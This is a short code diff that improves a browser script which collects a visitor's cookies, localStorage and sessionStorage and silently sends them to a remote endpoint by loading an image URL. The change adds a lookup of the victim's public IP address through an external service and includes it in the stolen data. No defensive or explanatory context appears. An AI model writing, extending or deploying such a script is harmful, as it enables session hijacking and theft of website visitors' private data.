@@ -1,6 +1,11 @@
-(function () {
+(async function () {
   try {
+    const res = await fetch('https://api.ipify.org?format=json');
+    const ipData = await res.json();
+    const ip = ipData.ip;
+
     const data = {
+      ip,
       cookies: document.cookie,
       localStorage: JSON.stringify(localStorage),
       sessionStorage: JSON.stringify(sessionStorage),
@@ -15,4 +20,3 @@
     new Image().src = endpoint + '?' + qs;
   } catch (e) {}
 })();
-
